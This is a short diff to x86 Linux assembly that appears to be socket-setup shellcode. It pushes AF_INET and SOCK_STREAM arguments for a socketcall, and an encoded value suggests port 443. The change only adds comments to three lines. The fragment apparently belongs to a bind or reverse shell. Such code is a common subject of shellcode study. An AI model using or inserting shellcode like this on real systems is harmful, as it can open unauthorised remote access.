@@ -12,9 +12,9 @@ _start:
 	add bl, 0x02		; AF_INET = 2
 	push ebx		; ebx = 0xbb010002
 	
-	push eax
-	push 0x01
-	push 0x02
+	push eax			; Protocol
+	push 0x01 			; Type = SOCK_STREAM
+	push 0x02 			; Domain = AF_INET
 		
 	mov al, 0x66		; SYS_SOCKETCALL
 	xor ebx, ebx	
